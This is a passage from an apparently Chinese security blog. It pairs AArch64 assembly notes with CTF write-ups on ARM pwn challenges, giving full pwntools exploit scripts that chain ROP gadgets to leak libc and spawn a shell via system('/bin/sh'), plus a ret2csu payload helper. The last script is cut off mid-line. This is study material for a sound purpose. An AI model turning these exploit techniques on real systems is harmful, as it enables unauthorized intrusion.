        <content type="html"><![CDATA[<h1 id="Aarch64-ASM"><a href="#Aarch64-ASM" class="headerlink" title="Aarch64 ASM"></a>Aarch64 ASM</h1><h2 id="常见寄存器"><a href="#常见寄存器" class="headerlink" title="常见寄存器"></a>常见寄存器</h2><p><a href="https://wiki.cdot.senecacollege.ca/wiki/AArch64_Register_and_Instruction_Quick_Start">https://wiki.cdot.senecacollege.ca/wiki/AArch64_Register_and_Instruction_Quick_Start</a></p><p>31个64bit通用寄存器 X0-X30(Wn是他们的低32位) 堆栈指针寄存器sp，指令指针寄存器pc</p><ul><li><strong>x0-x7 用于子程序调用时的参数传递，X0还用于返回值传递 ，多于参数通过栈传递</strong></li><li><strong>x8常用来存放系统调用号</strong></li><li><strong>x8-x15 临时寄存器，易变寄存器 子程序不需要保存</strong></li><li>r16-r17子程序内部调用寄存器IPC(intra-procedure-call)</li><li>x18 平台寄存器，它的使用与平台相关,避免使用</li><li><strong>x19-x28临时寄存器，子程序使用时必须保存</strong></li><li><strong>x29 栈帧寄存器fp(frame register)</strong></li><li><strong>x30 链接寄存器lr(link register）保存返回地址</strong></li><li><strong>堆栈指针寄存器sp</strong></li><li><strong>指令指针寄存器pc</strong>，<strong>aarch64的pc不能直接读写了，但某些指令可以间接使用，如adr和br，adr指令时pc值是按当前指令pc值来算，而不是和arm32一样的+4或+8</strong></li><li><strong>XZR(32位WZR)零寄存器</strong></li></ul><h2 id="指令助记符"><a href="#指令助记符" class="headerlink" title="指令助记符"></a>指令助记符</h2><table><thead><tr><th>整型</th><th></th></tr></thead><tbody><tr><td>W&#x2F;R</td><td>32bit整数</td></tr><tr><td>X</td><td>64bit整数</td></tr><tr><td>加载&#x2F;存储、符号-0扩展</td><td></td></tr><tr><td>B</td><td>无符号8bit字节</td></tr><tr><td>SB</td><td>带符号8bit字节</td></tr><tr><td>H</td><td>无符号16bit半字</td></tr><tr><td>SH</td><td>带符号16bit半字</td></tr><tr><td>W</td><td>无符号32bit字</td></tr><tr><td>SW</td><td>带符号32bit字</td></tr><tr><td>P</td><td>Pair（一对）</td></tr><tr><td>寄存器宽度改变</td><td></td></tr><tr><td>H</td><td>高位（dst gets top half）</td></tr><tr><td>N</td><td>有限位（dst &lt; src）</td></tr><tr><td>L</td><td>Long （dst &gt; src）</td></tr><tr><td>W</td><td>Wide (dst&#x3D;&#x3D;src1,src1&gt;src2) ？</td></tr></tbody></table><h2 id="常见指令"><a href="#常见指令" class="headerlink" title="常见指令"></a>常见指令</h2><p>指令定长32bit，ida里会生成一些8字节的伪代码</p><h3 id="mov"><a href="#mov" class="headerlink" title="mov"></a>mov</h3><p><strong>MOVK Rn, #imm, #shift</strong>:用于将一个 16 位立即数移动到指定的寄存器,左移偏移量shift用于指定将立即数放置在寄存器中的位置，<strong>其余位保持不变</strong></p><p><strong>MOVZ Rn, #imm, #shif</strong>:类似于movk，<strong>其余位置零</strong></p><h3 id="访存"><a href="#访存" class="headerlink" title="访存"></a>访存</h3><p><strong>adrl</strong>：和adr一样，是中等范围的地址读取伪指令</p><p><strong>ADRP Xd, symbol</strong>:(Address of Page) 把symbol向左移动12位 低位补零，移到Xd寄存器，所以就是一个page4k对齐的位置</p><ul><li>寻址数据时由于还是四字节定长指令，可以操作立即数太小，一般就addrp xd，sybols把页边界地址载入，再add xd，xd，offset，再加上页偏移来寻址</li></ul><p><strong>strb：</strong> (store register byte) 将寄存器中的值写入到内存中，只存储一个字节</p><p><strong>ldrb：</strong> (load register byte) 将内存中的值（只读取一个字节）读取到寄存器中，高位清零(无符号零拓展)</p><p><strong>ldrsb</strong>: (Load Register Signed Byte)加载一个有符号字节,将有一个字节按符号位拓展到寄存器字长</p><p><strong>ldrh</strong>：加载半个寄存器字长到寄存器，高位清零</p><p><strong>strh</strong>:半字存储</p><p><strong>swp</strong>：交换指令SWP X0，X1，[X2] ;将memory(X2)数据加载到X0，同时将X1中的数据存储到memory(X2)</p><h3 id="栈操作"><a href="#栈操作" class="headerlink" title="栈操作"></a>栈操作</h3><p><strong>stp：</strong> 入栈指令（<code>str</code> 的变种指令，可以同时操作两个寄存器）</p><ul><li><code>STP x4, x5, [sp, #-0x20]！</code>：将<code>sp+0x20</code>处依次覆盖为<code>x4，x5</code>，即<code>x4</code>入栈到<code>sp-0x20</code>，<code>x5</code>入栈到<code>sp-0x0x20+8</code>，最后<code>sp-=0x20</code></li></ul><p><strong>ldp：</strong> 出栈指令（<code>ldr</code> 的变种指令，可以同时操作两个寄存器）</p><ul><li><code>LDP x29, x30, [sp], #0x40</code>：将<code>sp</code>弹栈到<code>x29</code>，<code>sp+0x8</code>弹栈到<code>x30</code>，最后<code>sp += 0x40</code></li></ul><h3 id="分支跳转"><a href="#分支跳转" class="headerlink" title="分支跳转"></a>分支跳转</h3><p><strong>blr Xm</strong>：跳转到由Xm目标寄存器指定的地址处，同时将下一条指令地址存放到X30寄存器中</p><p><strong>br Xm</strong>：跳转到由Xm目标寄存器指定的地址处</p><p>**ret {Xm}**：子程序返回到由Xm目标寄存器指定的地址处，Xm不写默认是X30</p><p><strong>cbz Xm，label</strong>：Xm结果为零（Zero）则跳转label(只能跳到后面的指令)compare and branch if zero</p><p><strong>cbnz</strong>：不为0时跳转,只能跳到后面的指令</p><p><strong>svc #imm</strong>：软中断</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> x=<span class="number">0x12345678</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;hello,world&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%x&quot;</span>,x);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ida</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0000000000000754</span></span><br><span class="line">.text:<span class="number">0000000000000754</span>                               var_20= <span class="number">-0x20</span></span><br><span class="line">.text:<span class="number">0000000000000754</span>                               x= <span class="number">-4</span></span><br><span class="line">.text:<span class="number">0000000000000754</span></span><br><span class="line">.text:<span class="number">0000000000000754</span>                               ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0000000000000754</span> FD <span class="number">7B</span> BE A9                   STP             X29, X30, [SP,#var_20]!</span><br><span class="line">.text:<span class="number">0000000000000758</span> FD <span class="number">03</span> <span class="number">00</span> <span class="number">91</span>                   MOV             X29, SP</span><br><span class="line">.text:<span class="number">000000000000075</span>C <span class="number">00</span> CF <span class="number">8</span>A <span class="number">52</span> <span class="number">80</span> <span class="number">46</span> A2 <span class="number">72</span>       MOV             W0, #<span class="number">0x12345678</span></span><br><span class="line">.text:<span class="number">0000000000000764</span> E0 <span class="number">1F</span> <span class="number">00</span> B9                   STR             W0, [SP,#<span class="number">0x20</span>+x]</span><br><span class="line">.text:<span class="number">0000000000000768</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">90</span> <span class="number">00</span> C0 <span class="number">1</span>E <span class="number">91</span>       ADRL            X0, aHelloWorld         ; <span class="string">&quot;hello,world&quot;</span></span><br><span class="line">.text:<span class="number">0000000000000770</span> B0 FF FF <span class="number">97</span>                   BL              .<span class="built_in">printf</span></span><br><span class="line">.text:<span class="number">0000000000000770</span></span><br><span class="line">.text:<span class="number">0000000000000774</span> E1 <span class="number">1F</span> <span class="number">40</span> B9                   LDR             W1, [SP,#<span class="number">0x20</span>+x]</span><br><span class="line">.text:<span class="number">0000000000000778</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">90</span> <span class="number">00</span> <span class="number">00</span> <span class="number">1F</span> <span class="number">91</span>       ADRL            X0, aX                  ; <span class="string">&quot;%x&quot;</span></span><br><span class="line">.text:<span class="number">0000000000000780</span> AC FF FF <span class="number">97</span>                   BL              .<span class="built_in">printf</span></span><br><span class="line">.text:<span class="number">0000000000000780</span></span><br><span class="line">.text:<span class="number">0000000000000784</span> <span class="number">00</span> <span class="number">00</span> <span class="number">80</span> <span class="number">52</span>                   MOV             W0, #<span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000000788</span> FD <span class="number">7B</span> C2 A8                   LDP             X29, X30, [SP],#<span class="number">0x20</span></span><br><span class="line">.text:<span class="number">000000000000078</span>C C0 <span class="number">03</span> <span class="number">5F</span> D6                   RET</span><br></pre></td></tr></table></figure><p>objdump</p><p><img src="/2023/07/19/aarch64-asm/image-20230720143324402.png" alt="image-20230720143324402"></p><p>fp和sp都指向栈顶，原来的bp和返回地址存在栈顶，所以通过栈溢出基本修改不到本函数的返回地址，只能修改本函数调用者函数的bp和返回地址</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.cnblogs.com/lvdongjie/p/6644821.html">https://www.cnblogs.com/lvdongjie/p/6644821.html</a></p><p><a href="https://wiki.cdot.senecacollege.ca/wiki/AArch64_Register_and_Instruction_Quick_Start">https://wiki.cdot.senecacollege.ca/wiki/AArch64_Register_and_Instruction_Quick_Start</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>初探arm pwn</title>
      <link href="/2023/07/19/first-arm-pwn/"/>
      <url>/2023/07/19/first-arm-pwn/</url>
      
        <content type="html"><![CDATA[<p>链接：<a href="https://pan.baidu.com/s/1PT6DLLCDyQuFxYT95fkMtQ">https://pan.baidu.com/s/1PT6DLLCDyQuFxYT95fkMtQ</a><br>提取码：s1hv</p><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>gdb-multiarch和qemu-user远程调试</p><p>start-g.sh</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemu-arm -g 1234 -L /usr/arm-linux-gnueabi/ ./a.out</span><br></pre></td></tr></table></figure><p>attach.sh</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sudo gdb-multiarch ./a.out -ex <span class="string">&quot;target remote:1234&quot;</span></span><br></pre></td></tr></table></figure><p>python脚本里</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">io=process([<span class="string">&quot;qemu-arm&quot;</span>,<span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>,<span class="string">&quot;-L&quot;</span>,<span class="string">&quot;/usr/arm-linux-gnueabi/&quot;</span>,<span class="string">&quot;./elec_system2_patch&quot;</span>])<span class="comment">#调试</span></span><br><span class="line">io=process([<span class="string">&quot;qemu-arm&quot;</span>,<span class="string">&quot;-L&quot;</span>,<span class="string">&quot;/usr/arm-linux-gnueabi/&quot;</span>,<span class="string">&quot;./elec_system2_patch&quot;</span>])<span class="comment">#不调试</span></span><br><span class="line"></span><br><span class="line">gdb.attach(io,<span class="string">&#x27;target remote localhost:1234&#x27;</span>,exe=pwnfile,arch=<span class="string">&#x27;arm&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="2022安洵杯-babyarm"><a href="#2022安洵杯-babyarm" class="headerlink" title="2022安洵杯_babyarm"></a>2022安洵杯_babyarm</h2><p>首先是一个换表的base64加密   <a href="http://web.chacuo.net/netbasex">http://web.chacuo.net/netbasex</a> 直接网站解密一下</p><p>然后就是一个简单的栈溢出，先泄露libc ret2libc即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;arm&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./chall&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/usr/arm-linux-gnueabi/lib/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># io = process(pwnfile)</span></span><br><span class="line">    io=process([<span class="string">&quot;qemu-arm&quot;</span>,<span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>,<span class="string">&quot;-L&quot;</span>,<span class="string">&quot;/usr/arm-linux-gnueabi/&quot;</span>,<span class="string">&quot;./chall_patch&quot;</span>])</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line">db(<span class="string">&#x27;target remote localhost:1234&#x27;</span>)</span><br><span class="line"><span class="comment"># db(&#x27;b *0x0010C30&#x27;)</span></span><br><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2c</span></span><br><span class="line">passwd=<span class="string">b&#x27;s1mpl3Dec0d4r&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">overflow</span>(<span class="params">payload</span>):</span><br><span class="line">  sla(<span class="string">b&#x27;msg&gt; &#x27;</span>,passwd)</span><br><span class="line">  sla(<span class="string">b&#x27;res&gt; &#x27;</span>,padding+payload)</span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">main_addr = <span class="number">0x1050C</span></span><br><span class="line">pop_r3_pc = <span class="number">0x10464</span></span><br><span class="line">pop_r4_r5_r6_r7 = <span class="number">0x10cb0</span></span><br><span class="line">mov_r0_r7 = <span class="number">0x10ca0</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">grxer@Ubuntu22 ~/s/d/2022安洵杯_babyarm&gt; ROPgadget --binary ./chall --only pop                                                                                                                                     </span></span><br><span class="line"><span class="string">Gadgets information                                                                                                                                                                                                </span></span><br><span class="line"><span class="string">============================================================                                                                                                                                                       </span></span><br><span class="line"><span class="string">0x00010658 : pop &#123;fp, pc&#125;                                                                                                                                                                                          </span></span><br><span class="line"><span class="string">0x00010464 : pop &#123;r3, pc&#125;                                                                                                                                                                                          </span></span><br><span class="line"><span class="string">0x000105f0 : pop &#123;r4, pc&#125;                                                                                                                                                                                          </span></span><br><span class="line"><span class="string">0x00010cb0 : pop &#123;r4, r5, r6, r7, r8, sb, sl, pc&#125;      </span></span><br><span class="line"><span class="string">0x00010ca0 : mov r0, r7 ; blx r3 ; cmp r6, r4 ; bne #0x10c90 ; pop &#123;r4, r5, r6, r7, r8, sb, sl, pc&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">overflow(p32(pop_r4_r5_r6_r7) + p32(<span class="number">0</span>)*<span class="number">3</span> + p32(puts_got) + p32(<span class="number">0</span>)*<span class="number">3</span> + p32(pop_r3_pc) + p32(puts_plt) + p32(mov_r0_r7) + p32(main_addr)*<span class="number">8</span>)</span><br><span class="line">ru(<span class="string">b&#x27;nt&gt; &#x27;</span>)</span><br><span class="line"><span class="comment"># libc_base = u32(io.recv()[:4])</span></span><br><span class="line">libc_base =uu32(r(<span class="number">4</span>)) </span><br><span class="line">p(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">libc_base = libc_base - libc.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">p(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;system_addr&#x27;</span>,system_addr)</span><br><span class="line">p(<span class="string">&#x27;bin&#x27;</span>,binsh)</span><br><span class="line">overflow(p32(pop_r4_r5_r6_r7) + p32(<span class="number">0</span>)*<span class="number">3</span> + p32(binsh) + p32(<span class="number">0</span>)*<span class="number">3</span> + p32(pop_r3_pc) + p32(system_addr) + p32(mov_r0_r7) + p32(main_addr)*<span class="number">0x10</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p>和上一个题几乎一模一样</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;arm&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./elec_system2_patch&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/usr/arm-linux-gnueabi/lib/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># io = process(pwnfile)</span></span><br><span class="line">    <span class="comment"># io=process([&quot;qemu-arm&quot;,&quot;-g&quot;, &quot;1234&quot;,&quot;-L&quot;,&quot;/usr/arm-linux-gnueabi/&quot;,&quot;./elec_system2_patch&quot;])</span></span><br><span class="line">    io=process([<span class="string">&quot;qemu-arm&quot;</span>,<span class="string">&quot;-L&quot;</span>,<span class="string">&quot;/usr/arm-linux-gnueabi/&quot;</span>,<span class="string">&quot;./elec_system2_patch&quot;</span>])</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="comment"># db(&#x27;target remote localhost:1234&#x27;)</span></span><br><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x108</span></span><br><span class="line">sla(<span class="string">b&#x27;me: &#x27;</span>,<span class="string">b&#x27;admin&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Gadgets information</span></span><br><span class="line"><span class="string">============================================================</span></span><br><span class="line"><span class="string">0x000105c0 : pop &#123;fp, pc&#125;</span></span><br><span class="line"><span class="string">0x000103f0 : pop &#123;r3, pc&#125;</span></span><br><span class="line"><span class="string">0x00010558 : pop &#123;r4, pc&#125;</span></span><br><span class="line"><span class="string">0x0001070c : pop &#123;r4, r5, r6, r7, r8, sb, sl, pc&#125;</span></span><br><span class="line"><span class="string">0x000106fc : mov r0, r7 ; blx r3 ; cmp r6, r4 ; bne #0x106ec ; pop &#123;r4, r5, r6, r7, r8, sb, sl, pc&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">main_addr=<span class="number">0x10474</span></span><br><span class="line">pop_r3_pc = <span class="number">0x000103f0</span></span><br><span class="line">pop_r4_r5_r6_r7 = <span class="number">0x0001070c</span></span><br><span class="line">mov_r0_r7 = <span class="number">0x000106fc</span></span><br><span class="line">paylaod=padding+p32(pop_r4_r5_r6_r7) + p32(<span class="number">0</span>)*<span class="number">3</span> + p32(puts_got) + p32(<span class="number">0</span>)*<span class="number">3</span> + p32(pop_r3_pc) + p32(puts_plt) + p32(mov_r0_r7) + p32(main_addr)*<span class="number">8</span></span><br><span class="line">sla(<span class="string">b&#x27;ord: &#x27;</span>,paylaod)</span><br><span class="line">ru(<span class="string">b&#x27;ivity.\n&#x27;</span>)</span><br><span class="line">libc_base =uu32(r(<span class="number">4</span>)) </span><br><span class="line">p(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">libc_base = libc_base - libc.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">p(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;system_addr&#x27;</span>,system_addr)</span><br><span class="line">p(<span class="string">&#x27;bin&#x27;</span>,binsh)</span><br><span class="line">sla(<span class="string">b&#x27;me: &#x27;</span>,<span class="string">b&#x27;admin&#x27;</span>)</span><br><span class="line">paylaod=padding+p32(pop_r4_r5_r6_r7) + p32(<span class="number">0</span>)*<span class="number">3</span> + p32(binsh) + p32(<span class="number">0</span>)*<span class="number">3</span> + p32(pop_r3_pc) + p32(system_addr) + p32(mov_r0_r7) + p32(main_addr)*<span class="number">0x10</span></span><br><span class="line">sla(<span class="string">b&#x27;ord: &#x27;</span>,paylaod)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="ret2csu-arm"><a href="#ret2csu-arm" class="headerlink" title="ret2csu_arm"></a>ret2csu_arm</h2><p>基础栈溢出,但是要控制write函数的三个参数来泄露libc的gadget不好找，通用的模板就是__libc_csu_init</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">000104E0</span></span><br><span class="line">.text:<span class="number">000104E0</span>             loc_104E0                               ; CODE XREF: __libc_csu_init+<span class="number">50</span>↓j</span><br><span class="line">.text:<span class="number">000104E0</span> <span class="number">09</span> <span class="number">20</span> A0 E1                 MOV     R2, R9</span><br><span class="line">.text:<span class="number">000104E4</span> <span class="number">08</span> <span class="number">10</span> A0 E1                 MOV     R1, R8</span><br><span class="line">.text:<span class="number">000104E8</span> <span class="number">07</span> <span class="number">00</span> A0 E1                 MOV     R0, R7</span><br><span class="line">.text:<span class="number">000104</span>EC <span class="number">04</span> <span class="number">30</span> <span class="number">95</span> E4                 LDR     R3, [R5],#<span class="number">4</span>     ; r5 got表</span><br><span class="line">.text:<span class="number">000104F</span>0 <span class="number">01</span> <span class="number">40</span> <span class="number">84</span> E2                 ADD     R4, R4, #<span class="number">1</span></span><br><span class="line">.text:<span class="number">000104F</span>4 <span class="number">33</span> FF <span class="number">2F</span> E1                 BLX     R3</span><br><span class="line">.text:<span class="number">000104F</span>8 <span class="number">04</span> <span class="number">00</span> <span class="number">56</span> E1                 CMP     R6, R4</span><br><span class="line">.text:<span class="number">000104F</span>C F7 FF FF <span class="number">1</span>A                 BNE     loc_104E0</span><br><span class="line">.text:<span class="number">00010500</span> F0 <span class="number">87</span> BD E8                 POP     &#123;R4-R10,PC&#125;</span><br></pre></td></tr></table></figure><p>所以我们可以封装个函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">def <span class="title function_">ret2csu</span><span class="params">(padding,pop_r4_r10_ad,mov_r2_r9_ad,call_func_got_R5,arg0_R7,arg1_R8,arg2_R9,ret_ad)</span>:</span><br><span class="line">  &#x27;&#x27;&#x27;</span><br><span class="line">  pop_r4_r10_ad: csu里 POP     &#123;R4-R10,PC&#125;地址</span><br><span class="line">  mov_r2_r9_ad: csu里MOV     R2, R9地址</span><br><span class="line">  call_func_got_R5: 存有要执行函数地址的地址 一般为got</span><br><span class="line">  arg0_R7:参数<span class="number">1</span></span><br><span class="line">  arg1_R8:参数<span class="number">2</span></span><br><span class="line">  arg2_R9:参数<span class="number">3</span></span><br><span class="line">  ret_ad:执行过后返回的地址</span><br><span class="line">  <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">  R4=<span class="number">1</span></span><br><span class="line">  R6=<span class="number">2</span></span><br><span class="line">  R10=<span class="number">0xdeadbeef</span></span><br><span class="line">  payload=padding+p32(pop_r4_r10_ad)+p32(R4)+p32(call_func_got_R5)+p32(R6)+p32(arg0_R7)+p32(arg1_R8)+p32(arg2_R9)+p32(R10)+p32(mov_r2_r9_ad)</span><br><span class="line">  payload+=p32(R4)+p32(call_func_got_R5)+p32(R6)+p32(arg0_R7)+p32(arg1_R8)+p32(arg2_R9)+p32(R10)+p32(ret_ad)</span><br><span class="line">  sl(payload)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"><span class="title function_">context</span><span class="params">(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;arm&#x27;</span>)</span></span><br><span class="line">pwnfile=<span class="string">&#x27;./ret2libc_arm&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line">libc=ELF(<span class="string">&quot;/usr/arm-linux-gnueabi/lib/libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="meta"># io = process(pwnfile)</span></span><br><span class="line">    io = process([<span class="string">&quot;qemu-arm&quot;</span>,<span class="string">&quot;-L&quot;</span>,<span class="string">&quot;/usr/arm-linux-gnueabi/&quot;</span>,pwnfile])</span><br><span class="line">    <span class="meta">#io=process([<span class="string">&quot;qemu-arm&quot;</span>,<span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>,<span class="string">&quot;-L&quot;</span>,<span class="string">&quot;/usr/arm-linux-gnueabi/&quot;</span>,<span class="string">&quot;./ret2libc_arm&quot;</span>])</span></span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">ra = lambda: io.recvall()</span><br><span class="line">rl = lambda: io.recvline(keepends=True)</span><br><span class="line">ru = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = lambda: io.interactive()</span><br><span class="line">c = lambda: io.close()</span><br><span class="line">li = lambda x: <span class="built_in">log</span>.info(x)</span><br><span class="line">db = lambda x : gdb.attach(io,x)</span><br><span class="line">b = lambda : gdb.attach(io)</span><br><span class="line">uu32 = lambda x   : u32(x.ljust(<span class="number">4</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">uu64 = lambda x   : u64(x.ljust(<span class="number">8</span>,b<span class="number">&#x27;</span>\x00<span 